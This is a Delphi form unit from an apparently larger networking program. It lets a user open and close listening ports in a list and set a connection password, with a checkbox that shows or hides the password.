unit UnitSelectPorts;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Spin, ComCtrls, UnitConnection, UnitMain, Menus;

type
  TFormSelectPorts = class(TForm)
    lvPorts: TListView;
    se1: TSpinEdit;
    btn1: TButton;
    chk1: TCheckBox;
    edt1: TEdit;
    pm1: TPopupMenu;
    C1: TMenuItem;
    se2: TSpinEdit;
    lbl1: TLabel;
    procedure btn1Click(Sender: TObject);
    procedure C1Click(Sender: TObject);
    procedure chk1Click(Sender: TObject);
    procedure edt1Change(Sender: TObject);
  private
    { Private declarations }
    function GrabActivePortsList: string;
  public
    { Public declarations }
    procedure AddPort(Port: Word);
  end;

var
  FormSelectPorts: TFormSelectPorts;

implementation

uses
  UnitConstants;

{$R *.dfm}

procedure TFormSelectPorts.AddPort(Port: Word);
var
  PortList: TListItem;
begin
  if OpenPort(Port) = False then
  begin
    MessageBox(Handle,
               PChar('Failed to open port ' + IntToStr(Port) + '. This port is maybe in use.'),
               PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
               MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    Exit;
  end;

  PortList := lvPorts.Items.Add;
  PortList.Caption := IntToStr(Port);
  PortList.ImageIndex := 0;

  ActivePortList := GrabActivePortsList;
end;

function TFormSelectPorts.GrabActivePortsList: string;
var
  i: Integer;
begin
  Result := '';
  for i := 0 to lvPorts.Items.Count - 1 do
  Result := Result + lvPorts.Items.Item[i].Caption + '|';
end;

procedure TFormSelectPorts.btn1Click(Sender: TObject);
begin
  if se1.Text <> '' then AddPort(se1.Value);
end;

procedure TFormSelectPorts.C1Click(Sender: TObject);
var
  Port: Word;
begin
  if not Assigned(lvPorts.Selected) then Exit;
  Port := StrToInt(lvPorts.Selected.Caption);
  try ClosePort(Port) except end;
  lvPorts.Selected.Delete;
  ActivePortList := GrabActivePortsList;
end;

procedure TFormSelectPorts.chk1Click(Sender: TObject);
begin
  if chk1.Checked then edt1.PasswordChar := #0 else edt1.PasswordChar := '*';
end;

procedure TFormSelectPorts.edt1Change(Sender: TObject);
begin
  ConnectionPassword := edt1.Text;
end;

end.
